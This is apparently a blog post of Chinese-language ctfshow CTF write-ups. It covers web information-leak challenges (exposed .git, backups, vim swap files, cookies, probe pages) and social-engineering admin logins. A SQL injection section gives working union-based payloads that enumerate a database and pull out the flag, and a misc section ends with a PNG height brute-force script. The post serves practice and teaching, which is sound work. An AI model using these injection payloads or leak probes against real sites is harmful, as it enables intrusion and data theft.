ctfshow writeup

Posted on Mon, Feb 7, 2022 CTF Writeup

VIP题目限免

源码泄露

基础题，网页源码可以直接查看，既然注释没删，那么大胆猜测在页面的源代码上有注释。查看源代码后，flag即得。

前台JS绕过

基础题，前台JS锁右键是没有用的，直接打开网页任务管理器然后查看源代码就行了，这是因为网页资源加载后就已经在本地了。

协议头信息泄露

基础题，信息在网络中是通过一定的协议以报文形式传输，这里打开网页任务管理器，查看网络包，里面有个flag标签。

robots后台泄露

基础题，访问/robots.txt，根据提示信息“Disallow: /flagishere.txt”，访问/flagishere.txt，得到flag。

phps源码泄露

基础题，phps源码泄露指的是php被屏蔽，但是phps没有被屏蔽可以访问index.phps，以此获取网页文件的源码，即得flag。

源码压缩包泄露

基础题，如果测试的时候没有把压缩包删除，就可能导致压缩包的源代码泄露，这里通过猜测可能的压缩包后缀zip和可能的名字www可以得到源码压缩包。打开压缩包，可以看见服务器源文件夹下的文件情况，访问相应位置即得flag。

版本控制泄露源码

基础题，版本控制泄露意味着发布页面的时候没有去除.git文件夹，这个文件夹会包含网页的全部源代码。访问.git即得flag。

版本控制泄露源码2

基础题，版本控制泄露不一定是.git，也有其他的版本管理工具。参考版本控制 可以得到答案。

vim临时文件泄露

基础题，vim的临时文件后缀是swp，这里尝试查看一般网页的默认页index.php的vim修改文件index.php.swp文件，可以得到flag。

cookie泄露

基础题，cookie是用来保存一些服务器发到客户端中的信息，本题涉及这个知识点，查看cookie即可得知flag。有些网站把一些重要的数据放在了cookie里，这可能带来严重的信息泄露；一些网站通过cookie来维持登录状态，但是缺少一些防御措施来防御cookie泄露带来的身份伪造攻击。

域名txt记录泄露

基础题，考察域名解析相关的知识点，参考域名解析。可以利用这个网站进行查询：在线域名解析，也可以利用命令nslookup -qt=txt ctfshow.com

敏感信息公布

社工题，利用网络上的公开信息来破解网站的管理员密码，一般网站名称+admin就是管理页面。这里管理员账号试了Eflyer和admin，密码使用了页面上的电话号码便登录成功。

内部技术文档泄露

社工题，依旧是信息泄露，在网页上有个document，这个document包含了后台地址和默认的账号密码，这题是提醒我们信息安全的重要性，哪怕防御做再多，在一些基本问题上出错也是没有用的。

密码逻辑脆弱

社工题，后台地址依旧是默认的admin，然后这次多了个忘记密码的选项，根据页面公开的qq邮箱，可以查找相关的qq号，就可以知道账号主人的所在位置，根据这个位置，回答密码保护问题即可得到密码。

探针泄露

探针泄露会导致信息泄露进而导致服务器被攻破，但是这个探针的相关知识我了解甚少，于是我去查询了一些公开信息，找到了PHPInfo()信息泄漏漏洞利用及提权。了解了一个php探针泄露导致的攻击案例，但是我并没有在这个页面找到这一个探针。然后我继续查询了一些常见的探针，逐个尝试看是否有内容。然后发现tz.php确实有相关信息，再通过tz.php查看phpinfo便找到了flag。

CDN穿透

现在的web服务器会使用cdn来加快网页加载速度以及保护web服务器的真实ip，减少服务器遭到的攻击。如果想要攻击服务器，我们需要绕过CDN查找服务器的真实IP。这题我们直接ping，nslookup得到的IP都不是真实IP，而根据查询域名注册主体的相关信息，我们可以得知ctfer.com与ctf.show是一家公司进行注册的。

js敏感信息泄露

把结果写在前端js里面意味着结果对于游玩者而言是明文出现的，因此直接查看js代码，发现score > 100的相关内容里面有个语句是unicode的格式，转化出来，再用点脑洞就可以知道110.php这个位置了。。。

数据库文件data.mdb在早期asp+access这个架构下会被下载，查阅相关资料九种防mdb数据库被下载可以了解一些信息。然后尝试了data、db、database等路径和类似名字文件后找到了db/db.mdb文件。该文件用binary editor打开，然后搜索flag即可。

WEB

web2

参考资料：SQL注入之盲注 SQL注入题目，用户名填入' or 1=1;#提交，可以得到"欢迎你，ctfshow"的信息，应该是简单字符串拼接产生的SQL注入。同时，在密码处填入相同信息也可以绕过登录验证，这说明了username和password均为注入点。有了注入点，接下来我们要研究的是返回值，一个SQL注入漏洞必须提供返回值才能成功利用，不然这个漏洞的意义较小。

数据库名

方法1

通过试验order by number，我们可以知道结果有3个字段。 通过试验' or 1=2 union select 1,2,3;#'的返回值为“欢迎你，2”，我们得知返回值在第2个字段。 通过试验' or 1=1 and length(database()) > number'，得到数据库名称有四个字符。 通过试验' or 1=1 and ascii(substr(database(),1,1))>123;#，逐步得到四个字符。第一个为w，第二个为e，第三个为b，第四个为2，数据库名称即为题目名为web2。

方法2

直接' or 1=2 union select 1, database(), 3;#即可得到返回值欢迎你，web2。

用户名

根据' or 1=2 union select 1, user(), 3;#得到用户名为root@localhost为本地的root用户，因此我们应该可以访问所有的信息

表名

' and 1=2 union select 1, table_name, 3 from information_schema.tables where table_schema = 'web2' limit 0, 1;#得到表名flag' and 1=2 union select 1, table_name, 3 from information_schema.tables where table_schema = 'web2' limit 1, 2;#得到表名user

列名

' and 1=2 union select 1, column_name, 3 from information_schema.columns where table_schema='web2' and table_name='flag' limit 0,1;#得到列名flag

结果

' and 1=2 union select 1, flag, 3 from flag order by 1 limit 0, 1;#取该表该列第一项即可得到flag.

misc23

flag在时间里。

用exiftool查看exif信息或是直接用二进制编辑器打开查看，可以看到ctfshow{}、UnixTimestamp、DECtoHEX、getflag的提示信息，大概意思是把时间戳从十进制转成十六机制然后得到flag，然后这几个提示信息附件正好有些奇怪的时间，就把那些时间转成时间戳然后按先后顺序拼在一起即可得到flag。本题最重要的便是发现这些提示信息，一般在ctf题目中，一些能读得懂的信息都很重要。

misc25

flag在图片下面。

flag图片的高度被隐藏了，由于我使用linux，无法打开图片，用010editor可以发现crc较检错误，使用脚本测试高度即可。

# -*- coding: utf-8 -*-
import binascii
import struct
#\\x49\\x48\\x44\\x52\\x00\\x00\\x03\\x84\\x00\\x00\\x00\\x96\\x08\\x02\\x00\\x00\\x00
crc32key = 0x76EC1E40
for i in range(0, 65535):
  height = struct.pack('>i', i)
  #CRC: 76EC1E40
  data = '\\x49\\x48\\x44\\x52\\x00\\x00\\x03\\x84' + height + '\\x08\\x02\\x00\\x00\\x00'
  crc32result = binascii.crc32(data) & 0xffffffff
  if crc32result == crc32key:
    print ''.join(map(lambda c: "%02X" % ord(c), height))
